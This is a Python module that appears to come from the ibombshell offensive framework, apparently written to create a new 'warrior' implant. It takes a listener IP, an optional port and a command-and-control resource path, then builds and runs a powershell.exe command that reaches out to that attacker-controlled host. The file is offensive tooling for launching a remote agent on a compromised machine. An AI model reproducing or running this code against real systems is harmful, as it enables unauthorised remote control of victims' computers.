from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Create Warrior",
                       "Description": "Create a new warrior. Start-Job way!",
                       "Author": "@toolsprods"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "ip": [None,"IP or domain listener ibombshell",True],
                    "port": [None,"Port listener ibombshell",False],
                    "code": [None,"Resource for c2 of ibombshell",True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        if self.args["port"]:
            function = 'powershell.exe -C http://{}:{}/{}'.format(self.args["ip"], self.args["port"], self.args["code"])
        else:
            function = 'powershell.exe -C http://{}/{}'.format(self.args["ip"],self.args["code"])

        super(CustomModule, self).run(function)
